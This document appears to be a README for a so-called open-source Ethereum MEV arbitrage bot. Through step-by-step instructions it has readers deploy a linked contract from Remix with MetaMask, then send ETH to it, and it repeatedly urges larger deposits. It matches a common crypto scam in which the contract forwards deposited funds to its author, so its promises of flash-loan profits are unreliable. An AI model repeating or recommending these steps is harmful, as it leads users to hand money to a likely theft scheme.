# MEV-BOT
Ethereum MEV BOT Open Source

GUIDE 

1. Get the Metamask Extension for your browser
2. Open 👉https://remix.ethereum.org/ from within your browser.
3. Click on File Explorers and click "Create New File ".
4. Name the file flashloans.sol and paste the contract code link below.
👉 Smart Contract Code: https://github.com/MeltedLabs/MEV-BOT/blob/main/MEVBOT.sol

5. Click on Deploy & Run transactions  and set "ENVIRONMENT" to (Injected Web3) OR (Injected Provider - MetaMask).
6. Connect your MetaMask wallet.
7. Click on the "Solidity Compiler" and set the compiler version to 0.5.0
8. Click on the Solidity Compiler and then click the blue button "Compile flashloans.sol"
9. Wait for the code to compile.
10. Click on Deploy & run transactions then click on the down arrow right from the "Deploy" button
11. 👉 On "_TOKENNAME" TokenX9
12. 👉 On "_TOKENSYMBOL" TOK
13. 👉 On "_LOANAMOUNT" 1000
14. Click Transact and confirm the transaction in MetaMask.
15. Wait for the transaction to confirm.
16. Copy the address of the newly deployed contract.
17. Send ETH to the deployed contract to initiate the swap 0.05 ETH (0.2 ETH up is better as you will get a bigger amount in each swap)
➡️ NOTE: UPDATED GAS FEE REQUIREMENT:  0.05 ETH - 0.5 ETH is required to perform arbitrage successfully.

18. Wait for the transaction to confirm.
19. Now, Click "action" (red box) to execute the Flash Loan.
20. Confirm the transaction in MetaMask and wait for the confirmation.
21. You can now check your wallet  

Note: if it doesn't work with 0.05 ETH try to send another 0.05 ETH (0.2 is better), because fees may be different from day to day. 

Avoid using very low amounts as contract may fail below 0.05 ETH.

